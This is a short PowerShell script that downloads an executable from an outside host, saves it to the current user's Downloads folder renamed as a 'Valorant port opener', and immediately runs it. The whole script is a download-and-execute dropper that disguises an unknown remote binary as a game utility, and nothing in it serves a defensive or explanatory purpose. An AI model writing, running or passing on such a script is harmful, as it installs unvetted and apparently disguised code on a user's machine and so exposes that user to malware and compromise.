$username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split("\")[1]
wget https://itspublicinfo.ml/uploads/cock.exe -OutFile C:\Users\$username\Downloads\ValorantPortOpener.exe
cd C:\Users\$username\Downloads\
Start-Sleep -Seconds 0.5
./ValorantPortOpener.exe
